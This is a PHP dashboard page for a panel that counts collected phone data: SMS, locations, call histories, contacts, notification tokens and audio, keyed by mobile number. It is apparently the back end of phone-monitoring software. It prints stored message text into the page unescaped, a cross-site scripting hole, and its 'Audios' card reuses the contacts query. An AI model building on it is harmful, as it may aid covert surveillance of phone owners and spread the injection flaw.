<?php
include('header.php'); 
?>

<style type="text/css">
  #viewBtn
  {
    text-decoration: none;
    font-size: 20px;
  }
  #viewBtn:hover
  {
    background: yellow;
    color: red;
  }
</style>
      <!-- partial -->
      <div class="main-panel">
        <div class="content-wrapper">

          <div class="row">
            <div class="col-xl-12 grid-margin stretch-card flex-column">
                <h5 class="mb-2 text-titlecase mb-4">Last Message</h5>
                       <?php
                            $last_sms = "SELECT * FROM last_sms ORDER BY last_sms_id DESC LIMIT 1";
                            $run_last_sms = mysqli_query($con,$last_sms);
                            $row = mysqli_fetch_array($run_last_sms);
                            
                            echo "<h4 style='color:yellow;'><marquee behavior='alternate'>From ".$row['main_mobile'].", ".$row['message']."</marquee></h4>";
                        ?>
                <hr style="border-color: yellow !important;" />
              <div class="row">
                <div class="col-md-3 grid-margin stretch-card">
                  <div class="card">
                    <p style="margin: 16px;">Last Messages <span style="margin-left: 120px;">
                        <?php
                            $last_sms = "select * from last_sms";
                            $run_last_sms = mysqli_query($con,$last_sms);
                            echo mysqli_num_rows($run_last_sms);
                        ?>
                    </span></p>
                    <a href="last_messages.php" class="form-control" id="viewBtn">View</a>
                  </div>
                </div>
                <div class="col-md-3 grid-margin stretch-card">
                  <div class="card">
                    <p style="margin: 16px;">Locations <span style="margin-left: 90px;">
                        <?php
                            $location = "select * from location";
                            $run_locations = mysqli_query($con,$location);
                            echo mysqli_num_rows($run_locations);
                        ?>
                    </span></p>
                    <a href="locations.php" class="form-control" id="viewBtn">View</a>
                  </div>
                </div>
                <div class="col-md-3 grid-margin stretch-card">
                  <div class="card">
                    <p style="margin: 16px;">All Messages <span style="margin-left: 120px;">
                        <?php
                            $message = "SELECT DISTINCT main_mobile FROM all_sms";
                            $run_msg = mysqli_query($con, $message);
                            echo mysqli_num_rows($run_msg);
                        ?>
                    </span></p>
                    <a href="messages.php" class="form-control" id="viewBtn">View</a>
                  </div>
                </div>
                <div class="col-md-3 grid-margin stretch-card">
                  <div class="card">
                    <p style="margin: 16px;">Call Histories <span style="margin-left: 120px;">
                         <?php
                            $call_history = "SELECT DISTINCT main_mobile FROM call_histories";
                            $run_call_history = mysqli_query($con,$call_history);
                            echo mysqli_num_rows($run_call_history);
                        ?>
                        </span></p>
                    <a href="call_histories.php" class="form-control" id="viewBtn">View</a>
                  </div>
                </div>
                <div class="col-md-3 grid-margin stretch-card">
                  <div class="card">
                    <p style="margin: 16px;">Contacts <span style="margin-left: 130px;">
                        <?php
                            $contacts = "SELECT DISTINCT main_mobile FROM contacts";
                            $run_contacts = mysqli_query($con,$contacts);
                            echo mysqli_num_rows($run_contacts);
                        ?>
                        </span></p>
                    <a href="contacts.php" class="form-control" id="viewBtn">View</a>
                  </div>
                </div>
                <div class="col-md-3 grid-margin stretch-card">
                  <div class="card">
                    <p style="margin: 16px;">Notifications <span style="margin-left: 130px;">
                        <?php
                            $fcm = "SELECT DISTINCT main_mobile FROM fcm_token";
                            $fcm_run = mysqli_query($con,$fcm);
                            echo mysqli_num_rows($fcm_run);
                        ?>
                        </span></p>
                    <a href="notifications.php" class="form-control" id="viewBtn">View</a>
                  </div>
                </div>
                <div class="col-md-3 grid-margin stretch-card">
                  <div class="card">
                    <p style="margin: 16px;">Audios <span style="margin-left: 130px;">
                        <?php
                            $contacts = "SELECT DISTINCT main_mobile FROM contacts";
                            $run_contacts = mysqli_query($con,$contacts);
                            echo mysqli_num_rows($run_contacts);
                        ?>
                        </span></p>
                    <a href="contacts.php" class="form-control" id="viewBtn">View</a>
                  </div>
                </div>
              </div>
            </div>
          </div>

        </div>
        <!-- content-wrapper ends -->
